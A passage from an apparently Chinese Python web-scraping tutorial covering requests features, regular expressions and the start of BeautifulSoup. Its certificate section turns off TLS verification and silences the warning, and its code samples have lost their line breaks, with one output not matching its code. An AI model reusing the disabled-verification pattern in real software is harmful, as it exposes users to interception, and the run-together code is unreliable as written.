(&apos;im_used&apos;,),# Redirection.300: (&apos;multiple_choices&apos;,),301: (&apos;moved_permanently&apos;, &apos;moved&apos;, &apos;\\o-&apos;),302: (&apos;found&apos;,),303: (&apos;see_other&apos;, &apos;other&apos;),304: (&apos;not_modified&apos;,),305: (&apos;use_proxy&apos;,),306: (&apos;switch_proxy&apos;,),307: (&apos;temporary_redirect&apos;, &apos;temporary_moved&apos;, &apos;temporary&apos;),308: (&apos;permanent_redirect&apos;,      &apos;resume_incomplete&apos;, &apos;resume&apos;,), # These 2 to be removed in 3.0# Client Error.400: (&apos;bad_request&apos;, &apos;bad&apos;),401: (&apos;unauthorized&apos;,),402: (&apos;payment_required&apos;, &apos;payment&apos;),403: (&apos;forbidden&apos;,),404: (&apos;not_found&apos;, &apos;-o-&apos;),405: (&apos;method_not_allowed&apos;, &apos;not_allowed&apos;),406: (&apos;not_acceptable&apos;,),407: (&apos;proxy_authentication_required&apos;, &apos;proxy_auth&apos;, &apos;proxy_authentication&apos;),408: (&apos;request_timeout&apos;, &apos;timeout&apos;),409: (&apos;conflict&apos;,),410: (&apos;gone&apos;,),411: (&apos;length_required&apos;,),412: (&apos;precondition_failed&apos;, &apos;precondition&apos;),413: (&apos;request_entity_too_large&apos;,),414: (&apos;request_uri_too_large&apos;,),415: (&apos;unsupported_media_type&apos;, &apos;unsupported_media&apos;, &apos;media_type&apos;),416: (&apos;requested_range_not_satisfiable&apos;, &apos;requested_range&apos;, &apos;range_not_satisfiable&apos;),417: (&apos;expectation_failed&apos;,),418: (&apos;im_a_teapot&apos;, &apos;teapot&apos;, &apos;i_am_a_teapot&apos;),421: (&apos;misdirected_request&apos;,),422: (&apos;unprocessable_entity&apos;, &apos;unprocessable&apos;),423: (&apos;locked&apos;,),424: (&apos;failed_dependency&apos;, &apos;dependency&apos;),425: (&apos;unordered_collection&apos;, &apos;unordered&apos;),426: (&apos;upgrade_required&apos;, &apos;upgrade&apos;),428: (&apos;precondition_required&apos;, &apos;precondition&apos;),429: (&apos;too_many_requests&apos;, &apos;too_many&apos;),431: (&apos;header_fields_too_large&apos;, &apos;fields_too_large&apos;),444: (&apos;no_response&apos;, &apos;none&apos;),449: (&apos;retry_with&apos;, &apos;retry&apos;),450: (&apos;blocked_by_windows_parental_controls&apos;, &apos;parental_controls&apos;),451: (&apos;unavailable_for_legal_reasons&apos;, &apos;legal_reasons&apos;),499: (&apos;client_closed_request&apos;,),# Server Error.500: (&apos;internal_server_error&apos;, &apos;server_error&apos;, &apos;/o\\&apos;, &apos;✗&apos;),501: (&apos;not_implemented&apos;,),502: (&apos;bad_gateway&apos;,),503: (&apos;service_unavailable&apos;, &apos;unavailable&apos;),504: (&apos;gateway_timeout&apos;,),505: (&apos;http_version_not_supported&apos;, &apos;http_version&apos;),506: (&apos;variant_also_negotiates&apos;,),507: (&apos;insufficient_storage&apos;,),509: (&apos;bandwidth_limit_exceeded&apos;, &apos;bandwidth&apos;),510: (&apos;not_extended&apos;,),511: (&apos;network_authentication_required&apos;, &apos;network_auth&apos;, &apos;network_authentication&apos;),</code></pre><p><strong>实例代码：</strong></p><pre><code>import requestsresponse = requests.get(&apos;http://www.jianshu.com/hello.html&apos;)exit() if not response.status_code == requests.codes.not_found else print(&apos;404 Not Found&apos;)</code></pre><h3 id="3-requests-库的进阶使用"><a href="#3-requests-库的进阶使用" class="headerlink" title="3.requests 库的进阶使用"></a><strong>3.requests 库的进阶使用</strong></h3><h4 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="(1)文件上传"></a><strong>(1)文件上传</strong></h4><pre><code>import requestsfiles = {&apos;file&apos;:open(&apos;E:\\1.png&apos;,&apos;rb&apos;)}res= requests.post(&apos;http://httpbin.org/post&apos;,files=files)print(res.text)</code></pre><h4 id="2-获取-cookies"><a href="#2-获取-cookies" class="headerlink" title="(2)获取 cookies"></a><strong>(2)获取 cookies</strong></h4><pre><code>import requestsres = requests.get(&quot;http://www.baidu.com&quot;)for key,value in res.cookies.items():    print(key + &quot;=&quot; + value)</code></pre><h4 id="3-会话维持"><a href="#3-会话维持" class="headerlink" title="(3)会话维持"></a><strong>(3)会话维持</strong></h4><p>这个用法非常的重要，在我们的模拟登陆的过程中是必然会用到的方法，在 CTF 的写脚本的过程中也经常会用到，所以我们稍微详细解释一下</p><p>我们在使用 requests.get 的时候要明确一点就是，我们每使用一个 requests.get 就相当于重新打开了一个浏览器，因此上一个 requests.get 中设置的 cookie 在下面的第二次请求中是不能同步的，我们来看下面的例子</p><p><strong>实例代码:</strong></p><pre><code>import requests#这里我们设置了 cookie requests.get(&apos;http://httpbin.org/cookies/set/number/123456789&apos;)#我们再次发起请求，查看是否能带着我们设置的 cookie res = requests.get(&apos;http://httpbin.org/cookies&apos;)print(res.text)</code></pre><p><strong>运行结果：</strong></p><pre><code>{  &quot;cookies&quot;: {}}</code></pre><p>我们发现，正如我们上面分析的，我们第一次访问设置的 cookie 并没有在第二次访问中生效，那么怎么办呢，我们有一个 session() 方法能帮助我们解决这个问题</p><p><strong>实例代码：</strong></p><pre><code>import requestss = requests.Session()s.get(&apos;http://httpbin.org/cookies/set/number/123456789&apos;)res = s.get(&apos;http://httpbin.org/cookies&apos;)print(res.text)</code></pre><p><strong>运行结果：</strong></p><pre><code>{  &quot;cookies&quot;: {    &quot;number&quot;: &quot;123456789&quot;  }}</code></pre><h4 id="4-证书验证"><a href="#4-证书验证" class="headerlink" title="(4)证书验证"></a><strong>(4)证书验证</strong></h4><p>我们在访问 https 的网站的时候浏览器首先会对网站的证书进行校验，如果发现这个证书不是官方授权的话就会出现警告页面而不会继续访问该网站，对于爬虫来讲就会抛出异常，那如果我们想要让爬虫忽略证书的问题继续访问这个网站的话就要对其进行设置</p><h5 id="1-忽略证书验证"><a href="#1-忽略证书验证" class="headerlink" title="1.忽略证书验证"></a><strong>1.忽略证书验证</strong></h5><pre><code>import requestsresponse = requests.get(&apos;https://www.heimidy.cc/&apos;,verify=False)print(response.status_code)</code></pre><p>但是此时是存在一个警告的，我们可以通过导入 urilib3 的包，并调用消除 warning 的方法来消除这个警告</p><pre><code>import requestsfrom requests.packages import urllib3urllib3.disable_warnings()response = requests.get(&apos;https://www.heimidy.cc/&apos;,verify=False)print(response.status_code)</code></pre><h5 id="2-手动指定本地证书进行验证"><a href="#2-手动指定本地证书进行验证" class="headerlink" title="2.手动指定本地证书进行验证"></a><strong>2.手动指定本地证书进行验证</strong></h5><pre><code>import requestsresponse = requests.get(&apos;https://www.12306.cn&apos;, cert=(&apos;/path/server.crt&apos;, &apos;/path/key&apos;))print(response.status_code)</code></pre><h4 id="5-代理设置"><a href="#5-代理设置" class="headerlink" title="(5)代理设置"></a><strong>(5)代理设置</strong></h4><p>除了常见到的 https 和 http 代理以=以外，我们还可以使用 socks 代理，不过需要 pip 安装一个 requests[socks] 包</p><pre><code>import requestsproxies = {    &quot;http&quot;:&quot;http://127.0.0.1:1080&quot;,    &quot;https&quot;:&quot;https://127.0.0.1:1080&quot;}res = requests.get(&quot;https://www.google.com&quot;,proxies=proxies)print(res.status_code)</code></pre><p>这里有一个疑问就是我是用 socks 代理访问 google 是失败的，会报错</p><p><strong>实例代码：</strong></p><pre><code>import requestsproxies = {    &quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;,    &quot;https&quot;:&quot;socks5://127.0.0.1:1080&quot;}res = requests.get(&quot;https://www.google.com&quot;,proxies=proxies,verify=False)print(res.status_code)</code></pre><p><strong>运行结果：</strong></p><pre><code>SSLError: SOCKSHTTPSConnectionPool(host=&apos;www.google.com&apos;, port=443): Max retries exceeded with url: / (Caused by SSLError(SSLError(&quot;bad handshake: SysCallError(-1, &apos;Unexpected EOF&apos;)&quot;)))</code></pre><p>试了一些方法都没什么效果，有待以后考证</p><h4 id="6-超时设置"><a href="#6-超时设置" class="headerlink" title="(6)超时设置"></a><strong>(6)超时设置</strong></h4><pre><code>import requestsfrom requests.exceptions import ReadTimeouttry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5)    print(response.status_code)except ReadTimeout:    print(&apos;Timeout&apos;)</code></pre><h4 id="7-Basic-认证"><a href="#7-Basic-认证" class="headerlink" title="(7)Basic 认证"></a><strong>(7)Basic 认证</strong></h4><p><strong>实例代码一：</strong></p><pre><code>import requestsfrom requests.auth import HTTPBasicAuthr = requests.get(&apos;http://120.27.34.24:9001&apos;, auth=HTTPBasicAuth(&apos;user&apos;, &apos;123&apos;))print(r.status_code)</code></pre><p><strong>实例代码二：</strong></p><pre><code>import requestsr = requests.get(&apos;http://120.27.34.24:9001&apos;, auth=(&apos;user&apos;, &apos;123&apos;))print(r.status_code)</code></pre><h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="(8)异常处理"></a><strong>(8)异常处理</strong></h4><pre><code>import requestsfrom requests.exceptions import ReadTimeout, ConnectionError, RequestExceptiontry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5)    print(response.status_code)except ReadTimeout:    print(&apos;Timeout&apos;)except ConnectionError:    print(&apos;Connection error&apos;)except RequestException:    print(&apos;Error&apos;)</code></pre><h2 id="0X05-正则表达式"><a href="#0X05-正则表达式" class="headerlink" title="0X05 正则表达式"></a><strong>0X05 正则表达式</strong></h2><h3 id="1-什么是正则表达式"><a href="#1-什么是正则表达式" class="headerlink" title="1.什么是正则表达式"></a><strong>1.什么是正则表达式</strong></h3><p>正则表达式是对字符串进行操作的一种逻辑公式，用事先定义好的一些特定的字符，以及这些字符的组合，组成一个规则字符串，用这个规则字符串去表达对字符串的一种过滤的逻辑，在python 中使用过re 库来实现</p><h3 id="2-常见的匹配模式"><a href="#2-常见的匹配模式" class="headerlink" title="2.常见的匹配模式"></a><strong>2.常见的匹配模式</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%801.png" alt="此处输入图片的描述"></p><h3 id="3-re-match"><a href="#3-re-match" class="headerlink" title="3.re.match"></a><strong>3.re.match</strong></h3><pre><code>re.match(pattern, string, flags=0)</code></pre><h4 id="1-常规匹配"><a href="#1-常规匹配" class="headerlink" title="(1)常规匹配"></a><strong>(1)常规匹配</strong></h4><p>span() 方法是返回匹配的范围，group() 是返回匹配的结果</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;Hello 123 4567 World_This is a Regex Demo&apos;res = re.match(&apos;^\w{5}\s\d{3}\s\d{4}\s\w{10}.*Demo$&apos;,content)print(res.span())print(res.group())</code></pre><h4 id="2-泛匹配"><a href="#2-泛匹配" class="headerlink" title="(2)泛匹配"></a><strong>(2)泛匹配</strong></h4><pre><code>import recontent = &apos;Hello 123 4567 World_This is a Regex Demo&apos;res = re.match(&apos;^Hello.*Demo$&apos;,content)print(res.span())print(res.group())</code></pre><h4 id="3-匹配具体内容"><a href="#3-匹配具体内容" class="headerlink" title="(3)匹配具体内容"></a><strong>(3)匹配具体内容</strong></h4><p>我们如果想匹配具体的内容，我们可以用小括号将其括起来</p><pre><code>import recontent = &apos;Hello 1234567 World_This is a Regex Demo&apos;res = re.match(&apos;^Hello\s(\d+)\s.*Demo$&apos;,content)print(res.span(1))print(res.group(1))</code></pre><h4 id="4-贪婪与非贪婪模式"><a href="#4-贪婪与非贪婪模式" class="headerlink" title="(4)贪婪与非贪婪模式"></a><strong>(4)贪婪与非贪婪模式</strong></h4><p>所谓贪婪模式指的就是<code>.*</code> 会匹配尽可能多的字符，我们来看下面的例子</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;Hello 1234567 World_This is a Regex Demo&apos;res = re.match(&apos;^He.*(\d+).*Demo$&apos;,content)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code>(12, 13)7</code></pre><p>我们的本意是想匹配 1234567 这个字符串，但是实际上我们只匹配到了 7 ，因为<code>.*</code>默认的贪婪模式将123456匹配掉了，那么为了解决这个问题，我们可以使用<code>？</code> 去消除非贪婪模式</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;Hello 1234567 World_This is a Regex Demo&apos;res = re.match(&apos;^He.*?(\d+).*Demo$&apos;,content)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code>(6, 13)1234567</code></pre><h4 id="5-匹配模式"><a href="#5-匹配模式" class="headerlink" title="(5)匹配模式"></a><strong>(5)匹配模式</strong></h4><p>匹配模式是用来解决一些细节问题的，比如匹配中的是否区分大小写、是否能匹配换行符等</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;&apos;&apos;Hello 1234567 World_This is a Regex Demo&apos;&apos;&apos;res = re.match(&apos;^He.*?(\d+).*Demo$&apos;,content,re.S)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code>(6, 13)1234567</code></pre><p>可以发现我们的 <code>.*</code> 本来是不能匹配换行符的，但是我们使用了 re.S 的模式以后就可以正常匹配了</p><h4 id="6-转义字符"><a href="#6-转义字符" class="headerlink" title="(6)转义字符"></a>(6)转义字符</h4><p>如果在待匹配字符串中出现了正则表达式中的特殊字符，我们要对其进行转义操作</p><pre><code>import recontent = &apos;price is $5.00&apos;res = re.match(&apos;price is \$5\.00&apos;, content)print(res.group())</code></pre><h3 id="4-re-search"><a href="#4-re-search" class="headerlink" title="4.re.search"></a><strong>4.re.search</strong></h3><p>我们上面介绍的 re.match 有一个弊端就是它只能从开头开始匹配，也就是说如果我们的正则不匹配第一个字符那么是无法匹配中间的字符的，所以我们还有一个武器叫  re.search，它会扫描整个字符串并返回第一个成功的匹配。</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&apos;res = re.search(&apos;Hello.*?(\d+).*?Demo&apos;, content)print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code>1234567 </code></pre><p>因为这个特性能大大减少我们写正则的难度，因此，我们在能用 search 的情况下就不要用 match </p><h4 id="匹配练习："><a href="#匹配练习：" class="headerlink" title="匹配练习："></a><strong>匹配练习：</strong></h4><p><strong>实例代码：</strong></p><pre><code>import rehtml = &apos;&apos;&apos;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&apos;&apos;&apos;res = re.search(&apos;&lt;li.*?/2\.mp3.*?singer=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&apos;,html,re.S)print(res.group(1),res.group(2))</code></pre><p><strong>运行结果：</strong></p><pre><code>任贤齐 沧海一声笑</code></pre><h3 id="5-re-findall"><a href="#5-re-findall" class="headerlink" title="5.re.findall"></a><strong>5.re.findall</strong></h3><p>与之前两个不同的是 re.findall 搜会索字符串，并以列表形式返回全部能匹配的子串。</p><h4 id="匹配练习一："><a href="#匹配练习一：" class="headerlink" title="匹配练习一："></a><strong>匹配练习一：</strong></h4><p><strong>实例代码：</strong></p><pre><code>import rehtml = &apos;&apos;&apos;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&apos;&apos;&apos;res = re.findall(&apos;&lt;li.*?href=&quot;(.*?)&quot;.*?singer=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&apos;,html,re.S)#print(res)for i in res:    print(i[0],i[1],i[2])</code></pre><p><strong>运行结果：</strong></p><pre><code>[(&apos;/2.mp3&apos;, &apos;任贤齐&apos;, &apos;沧海一声笑&apos;), (&apos;/3.mp3&apos;, &apos;齐秦&apos;, &apos;往事随风&apos;), (&apos;/4.mp3&apos;, &apos;beyond&apos;, &apos;光辉岁月&apos;), (&apos;/5.mp3&apos;, &apos;陈慧琳&apos;, &apos;记事本&apos;), (&apos;/6.mp3&apos;, &apos;邓丽君&apos;, &apos;但愿人长久&apos;)]/2.mp3 任贤齐 沧海一声笑/3.mp3 齐秦 往事随风/4.mp3 beyond 光辉岁月/5.mp3 陈慧琳 记事本/6.mp3 邓丽君 但愿人长久</code></pre><h4 id="匹配练习二："><a href="#匹配练习二：" class="headerlink" title="匹配练习二："></a><strong>匹配练习二：</strong></h4><p><strong>实例代码：</strong></p><pre><code>import rehtml = &apos;&apos;&apos;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&apos;&apos;&apos;res = re.findall(&apos;&lt;li.*?&gt;\s*?(&lt;a.*?&gt;)?(\w+)(&lt;/a&gt;)?\s*?&lt;/li&gt;&apos;,html,re.S)for i in res:    print(i[0],i[1],i[2])</code></pre><p><strong>运行结果：</strong></p><pre><code> 一路上有你 &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt; 沧海一声笑 &lt;/a&gt;&lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt; 往事随风 &lt;/a&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt; 光辉岁月 &lt;/a&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt; 记事本 &lt;/a&gt;&lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt; 但愿人长久 &lt;/a&gt;</code></pre><h3 id="6-re-sub"><a href="#6-re-sub" class="headerlink" title="6.re.sub"></a><strong>6.re.sub</strong></h3><p>该方法的作用是替换字符串中每一个匹配的子串后返回替换后的字符串</p><p><strong>实例代码一：</strong></p><pre><code>import recontent = &apos;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&apos;res = re.sub(&apos;\d+&apos;,&apos;K0rz3n&apos;,content)print(res)</code></pre><p><strong>运行结果：</strong></p><pre><code>Extra stings Hello K0rz3n World_This is a Regex Demo Extra stings</code></pre><p>有时候我们替换的时候需要保留原始字符串，这个时候我们就要使用正则表达式的后向引用技术</p><p><strong>实例代码二：</strong></p><pre><code>import recontent = &apos;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&apos;content = re.sub(&apos;(\d+)&apos;, &apos;\\1 8910&apos;, content)print(content)</code></pre><p><strong>运行结果：</strong></p><pre><code>Extra stings Hello 1234567 890 World_This is a Regex Demo Extra stings</code></pre><h3 id="7-re-compile"><a href="#7-re-compile" class="headerlink" title="7.re.compile"></a><strong>7.re.compile</strong></h3><p>该方法可以将正则表达式转换成正则表达式对象，方便我们后期的复用</p><p><strong>实例代码：</strong></p><pre><code>import recontent = &apos;&apos;&apos;Hello 1234567 World_Thisis a Regex Demo&apos;&apos;&apos;pattern = re.compile(&apos;Hello.*Demo&apos;, re.S)res = re.match(pattern, content)print(res.group(0))</code></pre><h3 id="8-实战练习爬取豆瓣读书"><a href="#8-实战练习爬取豆瓣读书" class="headerlink" title="8.实战练习爬取豆瓣读书"></a><strong>8.实战练习爬取豆瓣读书</strong></h3><pre><code>import requestsimport recontent = requests.get(&apos;http://book.douban.com/&apos;).textpattern = re.compile(&apos;&lt;li.*?cover.*?href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*?more-meta.*?author&quot;&gt;(.*?)&lt;/span&gt;.*?year&quot;&gt;(.*?)&lt;/span&gt;.*?&lt;/li&gt;&apos;, re.S)results = re.findall(pattern, content)for result in results:    url, name, author, date = result    author = re.sub(&apos;\s&apos;, &apos;&apos;, author)    date = re.sub(&apos;\s&apos;, &apos;&apos;, date)    print(url, name, author, date)</code></pre><h2 id="0X06-BeautifulSoup"><a href="#0X06-BeautifulSoup" class="headerlink" title="0X06 BeautifulSoup"></a><strong>0X06 BeautifulSoup</strong></h2><h3 id="1-什么是-BeautifulSoup"><a href="#1-什么是-BeautifulSoup" class="headerlink" title="1.什么是 BeautifulSoup"></a><strong>1.什么是 BeautifulSoup</strong></h3><p>这是一个方便的网页解析库，不用编写正则就是实现网页信息的提取</p><h3 id="2-常见的配合使用的解析库"><a href="#2-常见的配合使用的解析库" class="headerlink" title="2.常见的配合使用的解析库"></a><strong>2.常见的配合使用的解析库</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%802.png" alt="此处输入图片的描述"></p><h3 id="3-基本使用"><a href="#3-基本使用" class="headerlink" title="3.基本使用"></a><strong>3.基本使用</strong></h3><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)print(soup.prettify())print(soup.title.string)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;html&gt; &lt;head&gt;  &lt;title&gt;   The Dormouse&apos;s story  &lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;   &lt;b&gt;    The Dormouse&apos;s story   &lt;/b&gt;  &lt;/p&gt;  &lt;p class=&quot;story&quot;&gt;   Once upon a time there were three little sisters; and their names were   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;    &lt;!-- Elsie --&gt;   &lt;/a&gt;   ,   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;    Lacie   &lt;/a&gt;   and   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;    Tillie   &lt;/a&gt;   ;and they lived at the bottom of a well.  &lt;/p&gt;  &lt;p class=&quot;story&quot;&gt;   ...  &lt;/p&gt; &lt;/body&gt;&lt;/html&gt;The Dormouse&apos;s story</code></pre><h3 id="4-标签选择器"><a href="#4-标签选择器" class="headerlink" title="4.标签选择器"></a><strong>4.标签选择器</strong></h3><h4 id="1-选择元素"><a href="#1-选择元素" class="headerlink" title="(1)选择元素"></a><strong>(1)选择元素</strong></h4><p>使用soup.(点)属性标签的方式来进行选择，如果有多个符合的话只能返回第一个匹配的标签</p><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)print(soup.head)print(soup.title)print(soup.p)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;</code></pre><h4 id="2-获取属性"><a href="#2-获取属性" class="headerlink" title="(2)获取属性"></a><strong>(2)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.p.attrs[&apos;name&apos;])print(soup.p[&apos;name&apos;])</code></pre><p><strong>运行结果：</strong></p><pre><code>dromousedromouse</code></pre><h4 id="3-获取内容"><a href="#3-获取内容" class="headerlink" title="(3)获取内容"></a><strong>(3)获取内容</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p clss=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were 